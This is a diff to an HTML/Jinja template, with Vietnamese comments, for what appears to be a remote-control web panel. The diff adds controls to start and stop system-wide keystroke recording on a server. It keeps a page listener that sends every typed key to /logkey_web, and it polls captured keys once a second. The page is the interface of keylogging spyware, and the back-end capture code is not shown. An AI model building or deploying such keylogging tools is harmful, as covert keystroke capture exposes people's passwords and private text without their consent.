@@ -254,11 +254,40 @@
         {% endif %}
 
         {% if mode == "keylogger" %}
-        <h2>Web Keylogger</h2>
-        <pre id="keylog" class="keybox">[Loading...]</pre>
+        <h2>Web & System Keylogger</h2>
+        
+        <div style="margin-bottom: 15px; text-align: center;">
+            <p style="margin-bottom: 10px;">Điều khiển ghi nhận phím trên Server:</p>
+            <button onclick="sendControl('keylog_start')" class="btn-action btn-start" style="padding: 10px 20px;">
+                ▶ Start Recording
+            </button>
+            <button onclick="sendControl('keylog_stop')" class="btn-action danger" style="padding: 10px 20px; margin-left: 10px;">
+                ■ Stop Recording
+            </button>
+        </div>
+
+        <p style="font-size: 0.9em; color: #666;">(File log cũ đã được xóa khi bạn truy cập trang này)</p>
+        <pre id="keylog" class="keybox">[Waiting for input...]</pre>
+        
         <script>
-            document.addEventListener("keydown", function(e){fetch("/logkey_web",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({key:e.key})})});
-            setInterval(()=>{fetch("/keylogger_data").then(r=>r.json()).then(d=>{const p=document.getElementById("keylog");p.textContent=d.keys;p.scrollTop=p.scrollHeight})},30);
+            // Gửi phím gõ trên web (giữ nguyên tính năng cũ)
+            document.addEventListener("keydown", function(e){
+                fetch("/logkey_web",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({key:e.key})})
+            });
+            
+            // Cập nhật log từ server mỗi 1 giây (thay vì 30ms để đỡ lag)
+            setInterval(()=>{
+                fetch("/keylogger_data")
+                .then(r=>r.json())
+                .then(d=>{
+                    const p=document.getElementById("keylog");
+                    // Chỉ cập nhật nếu có dữ liệu mới để tránh giật
+                    if(d.keys && d.keys !== p.textContent) {
+                        p.textContent = d.keys;
+                        p.scrollTop = p.scrollHeight;
+                    }
+                })
+            }, 1000); 
         </script>
         {% endif %}
 
